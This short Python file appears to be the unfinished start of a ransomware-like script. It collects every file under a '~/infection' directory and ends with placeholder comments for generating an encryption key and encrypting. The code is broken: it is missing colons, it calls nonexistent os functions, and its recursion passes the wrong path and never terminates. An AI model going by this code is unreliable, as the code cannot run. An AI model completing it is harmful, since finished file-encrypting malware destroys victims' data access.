import os

def	get_all_files(file_list, path):
	for entry in os.listdir(path)
		full_path = os.join(path, entry)
		if os.path.is_dir(full_path):
			get_all_files(file_list, path)
		elif os.path.is_file(full_path):
			file_list.append(full_path)

def get_file_list() -> list:
	file_list = []

	path = os.expanduser("~/infection")
	if not os.path.is_dir(path)
		return file_list
	get_all_files(file_list, path)
	return file_list

# generate encryption key

# encrypt key 